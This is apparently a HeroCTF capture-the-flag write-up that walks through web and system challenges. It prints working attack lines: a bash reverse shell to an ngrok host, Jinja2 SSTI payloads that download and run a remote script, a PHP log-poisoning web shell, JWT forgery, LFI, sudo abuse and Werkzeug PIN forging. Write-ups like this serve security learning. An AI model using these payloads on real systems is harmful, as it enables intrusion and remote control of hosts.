#### Math Trap
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c95cf4e2-bb75-4f89-8ef0-4cd610d630d6)

Since we're given a remote service to connect to let us see what it does

Connecting to it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8e1ad6a9-5129-4f1d-b4fe-effcfb7ce99c)

We're asked a calculation 

I used python to evaluate the question and then after getting the answer and giving the remote service the answer I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/17a26531-73a2-4f90-9c0e-57421c8b6c48)

I got *Too Slow* so basically we need to solve each math it gives

And doing this manually is not possible cause it also checks the answer received with time

The way forward is by scripting it and that's what I did

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/heroctf/prog/Math%20Trap/solve_2.py) it's not really well scripted but it does the job ðŸ˜„

Running it gives the flag 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/818ff725-48f2-4ec3-b982-13f4829581dd)

# Web

#### Referrrrer
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/076690c3-0ed8-4879-801d-a76742d1eb31)

After downloading the source code and unzipping it I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e69bdff-2bbb-4272-9d3e-e9d2860afe4d)

Reading the source code shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a9ee6b6c-1641-41dd-b669-ccb5a482b0c6)

So basically there are just two endpoints which are `/` and `/admin` 

Querying `/` just returns the string `Hello World`

But when you query `/admin` it checks for the referer header and compares it with the value `YOU_SHOUD_NOT_PASS!`

If the check is right we get the flag but if it isn't we get `Wrong header!`

Also here's the nginx config 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d9073c9f-3268-4481-867a-31e88630305b)

Basically we can see that if we query the admin endpoint it checks if the referer header is `https://admin.internal.com` 

If it isn't it returns 403 

Now the problem is for us to get the flag we need to set the referer header to `YOU_SHOUD_NOT_PASS!` but we also need to meet the nginx config check

After I researched about referer header I got to know that both `referer` and `referrer` can be used in expressjs 

Here's the [resource](https://github.com/expressjs/express/blob/master/lib/request.js#L77)

So now we can pass the two checks sweet ðŸ˜„

#### Drink from my Flask#1
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/689e407d-1a06-45f9-9ebb-2ceaeae7cc94)

After i deployed the instance going over to the web server shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca55bb12-7651-43ea-ae8d-89381f7533a6)

Looks like we can calculate stuff and yea we can
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c6fd7ef9-a5a9-4f41-a1dc-9a434a44ceb8)

At first I was thinking of python code injection but after hours it failed ðŸ˜¹

So lets see what we've got 

Checking the cookie reveals this jwt token
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/575a62ec-0b6c-425a-a0b4-15381deea8a4)

Decoding it using [jwt.io](https://jwt.io/) gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dc9a70e0-7928-43b5-bfff-d23b0e145015)

Notice the data value:

```json
{
  "role": "guest"
}
```

I'll try brute forcing the jwt token key and I got the SECRET key to be `key`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3f3e1409-5703-4208-8c34-49c64cee0440)

Now we can sign a new token as user admin 

But before that trying to access an invalid page returns this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7efea393-01d1-43ee-9972-7cb947aec1ef)

It shows that the valid paths are `/` and `/adminPage`

Notice also how the url path is reflected back to us 

Trying basic SSTI payload works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/91d7cff1-a703-429d-bc86-6132b3068375)

But let's see the adminPage endpoint
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bd16c9ef-c6e6-4999-8641-fff30703c95b)

We notice that it reflects back the role value for the jwt token 

So what i tried was using a ssti payload as the username signing the token using the SECRET key as `key` then replacing it with my token
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e0156df-5063-4213-bcaa-d06acedd2210)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/703b1511-f86c-4c5e-a68b-93bdb6259ae1)

It works so there's ssti both on the url path and the role value in the jwt token

But trying a payload gotten from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution) doesn't work when i used it in the url
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dcbdb5b7-ce4c-4c94-9b8e-6cdff1b09912)

But when used in the jwt token It works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bd379737-ea68-420c-883c-5338192b444a)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e03df946-d9fa-44a9-89ad-6ae9b1986146)

If you notice doing that manually is quite stressfull so with the help of google I searched on how to sign a key with python and i made this [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/heroctf/Web/Flask1/ssti.py)

Using it I can execute command
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5bba895d-b763-4786-a6ca-079f52dee100)

Time for a reverse shell

I had to edit my ngrok config file to tunnel 3 connections

```yml
version: "2"
authtoken: [REDACTED]

tunnels:
  app-0x:
    addr: 80
    proto: tcp
  app-dead:
    addr: 443
    proto: tcp
  app-beef:
    addr: 1337
    proto: http
```

Now I made it start all 3 tunnels
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4febc6d1-1deb-4669-9b61-87beec8d7865)

Back on getting shell here's my payloads

I stored this in a file called `lol.sh`

```sh
sh -i >& /dev/tcp/0.tcp.eu.ngrok.io/19990 0>&1
```

Then i started a python web server on that same directory and used this, btw I also hosted a nc listener on port 443

```
python3 ssti.py http://dyn-02.heroctf.fr:14278 "{{ cycler.__init__.__globals__.os.popen('curl http://6.tcp.eu.ngrok.io:10227/lol.sh -o /tmp/lol.sh').read() }}"
python3 ssti.py http://dyn-02.heroctf.fr:14278 "{{ cycler.__init__.__globals__.os.popen('chmod +x /tmp/lol.sh').read() }}"
python3 ssti.py http://dyn-02.heroctf.fr:14278 "{{ cycler.__init__.__globals__.os.popen('bash /tmp/lol.sh').read() }}"
```

From there I got shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d289dc00-eed8-441c-b66f-79426e613945)

And we have the flag 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a5e6497c-4dbe-4226-a793-0c8e5bba018e)

# System

#### Chm0d 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0b569148-b584-4fa0-901c-c64d4919d4fc)

I had to first deploy an instance
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ce755e31-79e2-418f-ac2b-477f906be97f)

Now I logged in using the cred given
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0d5c3534-b8ed-4296-bb6a-a2fc9323c8fe)

Checking the */* directory shows that the flag is there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2686b438-5520-41cb-ba3d-af84ee28cad7)

And noticing the permission set on it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6f9b086f-cbeb-414a-b78b-7ab8b0706a9a)

At the moment we don't have any read/write/execute permission over the file

But since the file is owned by us so, we can change the permission set on it using *chmod*

Trying it gives permission denied
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/126f0bca-845b-4fac-806d-ccd92a1b35f8)

Hmmmmm let us see what permission is set on the chmod binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3c49ca86-48cb-4ac0-a6af-85f8ab2b1678)

Dang it's permission is the same as the flag.txt file and since the binary is owned by root we can't change it

At this point I taught I had to do privilege escalation so using *scp* I transferred *linpeas.sh* to the box
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c5419c36-de68-4d58-93ae-1cb369259264)

I immediately noticed that the linpeas i transferred has execute permission set on it 

So maybe any file that is transferred to the box will automatically have execute perm set on it

This is good cause now I can upload my own machine *chmod* binary to the box then run it

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f3235ee6-2bb5-44c1-89d0-73a102aa99e3)

Now that we have chmod binary on it which has execute permission we can then change the permission on the flag file then read it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a23b27b2-5821-46a9-ba72-bc414feac8ba)

#### IMF#0: Your mission, should you choose to accept it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4531861-09dc-4f2f-bb2b-0d9bc5b2dae1)

This is just the message asking if we accept the upcoming mission

And the flag is just right there

```

#### SUDOkLu
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/edad7b26-fcc7-47d9-b996-f56b28f259ba)

First I started an instance
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cc8d7191-157c-4594-b590-f9af3aaf750b)

Then i logged in to ssh
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ea098a6-d122-4d88-9dcc-7e31c98c903d)

We know that the goal is to read the file at `/home/privilegeduser/flag.txt`

But we are currently user `user` so we will be doing some privilege escalation

Checking for sudo permission shows that we can run */usr/bin/socket* as user *privilegeduser*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5f442fee-cf1c-4ae7-95c2-f3fde4f9abb6)

Moving over to [gtfobins](https://gtfobins.github.io/gtfobins/socket/) shows that we can get a reverse shell via the socket binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/61d8167d-4d94-4ca4-bd5d-6b9a90754dd3)

We were given the internal IP for the machine and luckily there's netcat on the machine
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f885fb67-8a96-4cd2-b9fd-0b3a723cee35)

So we'll be using nc to catch the reverse shell

I ssh to another session where my reverse shell will be caught
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c8984fb1-a0b7-4732-a34a-bfe3b137788a)

And we get the flag

```

#### IMF#1: Bug Hunting
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/807bd6ce-c01a-4539-b5c3-424c9f467f78)

I started an instance as usual first
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/afb3e9b9-71fc-4316-9651-7f6a52584c91)

Remember initially we were given the cred to ssh which is `bob:password`

We're given two boxes attempting to login to ssh with the first host fails
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1dfc0235-e19e-4e13-9ae4-191eb5e73c31)

But for the second one it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac79ec0c-6fd7-4a02-824f-111bb4b65ccc)

There's a *welcome.txt* in the user's home directory

Checking it's content gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3172d0a2-7167-4710-825d-822e15a1ba21)

```
Hi Bob!

Welcome to our firm. I'm Dave, the tech lead here. We are going to be working together on our app.

Unfortunately, I will be on leave when you arrive. So take the first few days to get familiar with our infrastructure, and tools.

We are using YouTrack as our main issue tracker. The app runs on this machine (port 8080). We are both going to use the "dev" account at first, but I will create a separate account for you later. There is also an admin account, but that's for our boss. The credentials are: "dev:aff6d5527753386eaf09".

The development server with the codebase is offline for a few days due to a hardware failure on our hosting provider's side, but don't worry about that for now.

We also have a backup server, that is supposed to backup the main app's code (but it doesn't at the time) and also the YouTrack configuration and data.

Only I have an account to access it, but you won't need it. If you really have to see if everything is running fine, I made a little utility that run's on a web server.

The command to check the logs is:
curl backup

The first backups might be messed up a bit, a lot bigger than the rest, they occured while I was setting up YouTrack with it's administration account.
Hope you find everything to you liking, and welcome again!

Dave
```

After reading it here's what I understood from it:
- There's a web server which is running YouTrack hosted on port 8080
- We are already given the dev credential 
- There is also a backup server and to access it is by using curl which just checks the log 
- Hint pointing at the which backup file the YouTrack administrator password is stored

Since there's a web server hosted locally and it is running YouTrack, I used ssh portforward to make it accessible to my host
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/47e5388d-bee5-4251-8de8-c8352823d58f)

```
Command: ssh -L 8000:127.0.0.1:8080 bob@dyn-05.heroctf.fr -p13654
```

We can confirmed it worked by scanning our host
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/547f4d55-b183-4ea6-a0ea-51acec450635)

Dave gave us the dev user credential to be `dev:aff6d5527753386eaf09`

Moving over to my web browser shows a login page
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8095f857-5bca-46ba-adba-79447d8dc5f7)

Using the credential works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6d09fe46-c1e5-411b-a4d5-997e4a04a938)

Next thing I noticed is the verson of the web app which is:

```
YouTrack 2020.5.2579 
```

Searching for exploits leads [here](https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e4439eb3-6d6e-4754-ac09-28189c9d483b)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d1318468-5d1a-45d6-b192-91dc929493e1)

But after reading the exploit which is basically exploiting Server Side Template Injection (SSTI) it requires a privileged admin user account and our account isn't an admin account so let us put this aside for now

Looking through the web app shows this issue page
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fb350698-c2a2-458e-9876-acac539e8f8d)

Clicking on the first issue gives the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e6a04139-2589-426c-97d8-979439fadaa3)

#### IMF#2: A woman's weapon
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/20cd5a36-475f-4b17-966f-6279b21e9a8e)

I got third blood in this challenge hahaha ðŸ©¸
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d5faa8e-c98f-4827-862d-134d196f2234)

Now back to the web app

The other issues are not of importance except this one
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/40255124-e74f-4280-ad9d-ed50b0cf8df1)

It's talking about the *Backup Log checking utility* and remember that *Dave* said there's a backup server

I downloaded the script to my host and here's the content
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a96ecdae-a0dd-4d3b-8c7e-ee100884a30a)

```php
<?php
    $file = $_GET['file'];
    if(isset($file))
    {
        include("$file");
    }
    else
    {
        include("/var/log/backup.log");
    }
?>
```

Now if you remember that *Dave* said the command to check the log is *curl backup* so this means that backup is a web server running on port 80

Pinging it from the host we currently have access to shows this

So basically this is the second host as we can tell from it's ip *i.e the box that when we tried loggin to ssh didn't work*

For us to access the host we need to port forward it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bab12814-abe4-4a4d-a15e-ede1423c80ca)

Now we can access it from our host
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/52ba9d8d-a502-4484-9e5b-b5887ab2ceb1)

But it returns the backup log file and this is intended cause no file parameter was passed in the url

Back to the script we can see it uses *include* to get the content of the file passed in the *$file* parameter and this vulnerable to Local File Inclusion (LFI) due to the usage of *include*

Let us confirm it first
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b0f18a22-6a71-40d3-a1b8-22a92042f7c2)

Cool it works. At this point let's further exploit this vulnerability to get Remote Code Execution (RCE)

There are various ways or achieving this but in this case i'll go with Log Poisoning

First lets determine what web server this web app is built on

Using wappalyser extension i achieved that though you can use nmap,curl,http-header to fingerprint that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8ce3e9ed-c1d4-49a8-9dee-f096f76ebaab)

The web server is *Nginx*. This is needed cause for log poisoning, we need to know where the log files are placed

And from Nginx it's default is:

```
/var/log/nginx/access.log
```

Including the log file works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a7c8a7ac-c8fd-4fb1-bd83-a147989d6e99)

So let us go ahead with the attack

I used burp to work with the header manipulation
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57536df4-7003-4847-ba10-bd0bdf2122b6)

First thing to do is to inject this php code in the user-agent header
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7fe60d2d-16ee-4567-815b-0c64978536b3)

```php
<?php system($_GET['cmd']); ?>
```

Also forward the request at least three times for it to appear in the log file

From here we can get code execution
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a5cb8e0b-7a05-4220-a71d-1013a20c3a46)

Looking at the result we see that we are user `www-data`

Let us get a reverse shell. 

Since there's already nc on the other host, I just used it to host a python web server which contains a file *lol.sh* and the file content is that of a bash reverse shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/606d2b8e-2eea-477f-b187-f6e703339f7c)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cc38bd4e-ca42-4521-ab19-25de8e2c1722)

Now i will make the file at */tmp/lol.sh* executable then run it and hope to catch my reverse shell in my listener
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2bbf4f95-ff77-4609-a0db-493fb0ffc063)

Back on our listener for our shell fingers crossed ðŸ¤ž
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d8226940-56ef-49c0-a450-8c29883276ec)

Let us now stabilize it using python
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f67e2b1e-738a-4fe5-b332-f3781fa0d9c4)

User www-data is less privileged so lets see how we can escalate privilege

Running *sudo -l* shows that user *www-data* can run */usr/bin/rsync* as user *backup*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b7db3689-03c3-499d-8dbc-c9fd6e3b5d3d)

Moving over to [gtfobins](https://gtfobins.github.io/gtfobins/rsync/#sudo) shows a way we can abuse the permission to get shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0795b827-5180-4101-aed2-6fb2f906fc00)

Trying it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/29f8c5e2-de28-47bb-ae96-4be32a9fa325)

Now that we are user *backup* lets see what we have access to
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0407c34a-f8bd-416a-8cb3-400b35f0a076)

#### IMF#3: admin:admin
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7948995e-ec51-4342-b6a4-e23e98abe3a9)

I got 2nd blood on this challenge ðŸ©¸
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eece97e9-dbd0-4206-91da-808dcbacca03)

From the challenge description it seems we're to find credential of the admin user

And looking at our current working directory shows multiple zip files
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3ba10c4-868b-45e4-b8e7-ae7ec6698994)

If we were to find a password it would be quite stressfull as this zip files are much 

But now remember the hint from the note Dave gave:

```
The first backups might be messed up a bit, a lot bigger than the rest, they occured while I was setting up YouTrack with it's administration account.
Hope you find everything to you liking, and welcome again!
```

This is great cause now we can limit our search to a precise file

And what we can use is the file size and also date 

Looking at the result we can see that the best zip file to be searched is *youtrack-1683836642.zip*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/94424654-2f43-4996-8ce2-04cc941617a3)

Reason is because:
- It's file size is different from the other files
- The time it was created is one day different than the others which are just the same

Now that we've proposed our theory let us now unzip it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8e1e756d-8116-4412-9871-d32a7c36820b)

Searching through each of the files is stressfull so I used *grep* to recursively search for the string *password*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5a909c85-5565-4427-b1c4-f4b2b2390c91)

We see a password which looks like what a real admin would use haha

So the cred is likely `admin:Th1sIsAV3ryS3cur3Adm1nP4ssw0rd0101#`

Since *Dave* was referring to the cred of the *YouTrack* web service let us try logging in as admin using this newly found password
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eef55085-c232-452e-b9f7-c4baf0339480)

Cool since we're admin we can further exploit this web app

Remember that we got a [vulnerability](https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html) which took exploited the web app via SSTI 

Following the instruction lead to remote code execution
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d6db81a-1d45-4399-bea5-af2a96e2b83f)

We are user *dave* 

I made it list the files in dave's directory
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53dbc37f-5d83-4151-b1bf-d62975db0760)

From here we can cat the file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bb01b081-190d-4cb0-b7c0-9f7ad44a63b2)

Let us get this over with ðŸ™‚

Since we already have code execution on the box let's see if we can get shell

I checked if there was any ssh key for user dave and there wasn't
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4eb42fd2-0115-4dc2-a1c3-8cb0deb3e842)

But I noticed a file *randomfile.txt.enc* and also *.bash_history* in the user dave directory so i copied it to /tmp
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6dc11b31-1c6e-4d0f-9440-a7a72d6a31ee)

Back on the box we can now access the file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f82cab2c-3bbc-4f5c-b275-743ffc9af0db)

We see that this is the command used to create the *radnomfile.txt.enc*:

```
openssl aes-256-cbc -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt -out randomfile.txt.enc
```

It's using open ssl aes encryption to decrypt it this is the command:

```
openssl aes-256-cbc -d -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt.enc -out randomfile.txt.dec
```

Running that decrypts the file and I got the flag

This was rated Hard and it was to me it was lol ðŸ˜¹

Since this is a continuation of the Flask#1 box lets see what we can do

Going over to the user's home directory shows the flag but we don't have access over it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0bdb797e-f8f1-4ec6-ae96-09b836d5ed4c)

Checking the content of the reboot script shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4510d353-986a-484a-ab78-45dcdb1354ae)

```bash
if [ `ps -aux | grep -E ".*/usr/bin/python3 /var/www/dev/app.py" | wc -l` != "2" ]
then
    pkill python3 -U 1000
    /usr/bin/python3 /var/www/dev/app.py # This dev app is not exposed, it's ok to run it as myself  
fi
```

The script checks if /var/www/app/app.py is running, and if not, kills every owned python3 process and restarts the app. Since the cron deamon is running, it's pretty safe to assume that there is cronjob running this script at a regular interval.

And also cron is running 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f8a8b8ca-48dc-423b-ba4c-a333a363ba89)

Reading the file shows that it's like the same vulnerable ssti source code
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/434d6fef-8a6a-4f15-80e4-e47d67ed14cd)

And it's running internally on port 5000

What I did while trying it was to port forward it to my host to see if it was vulnerable to ssti but it wasn't 

And the reason is here:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/65fee0e8-c2bb-4ed5-a2a3-addc8030010f)

The way it is formatted isn't the same as the one in the vulnerable app.py
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09eb5221-b7cd-46dd-95df-a79626bbe92d)

Also it's running internally on port 5000 

There's another thing to notice
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e95a38ac-985f-4ec3-bfd0-3edee642fe48)

A `urandom` file is stored in the config directory which is symbolically linked with `/dev/urandom` ðŸ¤”

Well let's see...... 

The internal web server running on port 5000 has Debug set to True
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eb595b83-aad8-4a55-ba2f-53fcda223533)

That means that /console would be open 

But we would need a key to unlock the prompt

It is easy to recreate the key since we have access to the box already 

From this [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) blog shows how it can be done

But the problem is when we read the debug/__init__.py file located here:

```
Path: /usr/local/lib/python3.10/dist-packages/werkzeug/debug/__init__.py
```

It shows this:

```python
def get_pin_and_cookie_name(
    app: "WSGIApplication",
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
    """Given an application object this returns a semi-stable 9 digit pin

    Second item in the resulting tuple is the cookie name for remembering.

        if "-" in pin:

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

Notice the private bits variable 

```python
    private_bits = [
        str(uuid.getnode()),
        get_machine_id(),
        open("/var/www/config/urandom", "rb").read(16) # ADDING EXTRA SECURITY TO PREVENT PIN FORGING
    ]
```

We know that to get the pin we need the private bits and also the public bits which is easy to get:

```python
probably_public_bits = [
    'flaskdev',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]
```

How i got the path of the app.py is by causing an error by trying to divide a number by zero

Let us first get the other required private bit values

Now back to the private bit from the __init__.py file

```python
    private_bits = [
        str(uuid.getnode()),
        get_machine_id(),
        open("/var/www/config/urandom", "rb").read(16) # ADDING EXTRA SECURITY TO PREVENT PIN FORGING
    ]
```

We see that the developer included another value which reads in 16 bytes from the urandom binary located at */var/www/config/urandom*

That is very impossible to guess but good thing is that we have full permission over that directory

So the idea is that we can remove that binary then put null bytes into it, then when the script forms the new pin when cron runs it will then be predictable

Now that we have all this let us get the pin

Here's the [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/heroctf/System/Flask2/genkey.py) I used

Running it gives the key

With this we can port forward the internal server on port 5000 to our host

First I had to upload chisel to the box

But we will need to restart the web app on another port since it kills every owned python3 process and restarts the app. Since the cron deamon is running, it's pretty safe to assume that there is cronjob running this script at a regular interval. There is subtility to note here. As we saw in the previous challenge Flask#1 , flaskdev is not the best developer there is. His mistake in this script was to check for every instance of the app running, regardless of the user who launched it, and to make a strict comparison to 2. This means that if we run the app with our current user, the script will find 3 lines in the output of ps -aux, and will kill it's own app, only to restart it moments later.

Let's restart the app with the knowledge we acquired earlier when analysing the reboot_flask.sh script. We have to run the app on a different port, since 5000 is already in use.

After a minute, flaskdev's instance should have rebooted, we can kill our own.

To port forward is this way:

```
Host: chisel server -p 80 --reverse
Target: ./chisel client 7.tcp.eu.ngrok.io:11451 R:8001:127.0.0.1:1337 &
```

We can now access the debugging console and get the flag.

```python
>>> import os ; os.popen('cat /home/flaskdev/flag.txt').read()
'Hero{n0t_s0_Urandom_4ft3r_4ll}\n'
```

And we're done ðŸ‘»
